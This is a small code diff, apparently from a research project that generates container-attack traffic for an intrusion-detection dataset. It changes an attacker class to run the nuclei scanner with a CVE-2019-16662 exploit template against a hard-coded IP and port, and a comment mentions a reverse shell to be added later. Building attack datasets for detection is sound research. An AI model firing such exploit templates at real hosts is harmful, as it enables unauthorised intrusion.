@@ -19,7 +19,7 @@ class OSCI_CVE_2019_16662_Attacker2(AttackerBase):
     def main(self):
         print("Main method started")
         #self.commandRunner.runCommand('echo "nuclei script started" ')     
-        self.commandRunner.runCommand('nuclei -u https://144.122.71.18:30003 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-15107_payload1.yaml')
+        self.commandRunner.runCommand('nuclei -u http://144.122.71.18:30004 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-16662_payload1.yaml')
 
 
     # Reverse shell will be handle later...
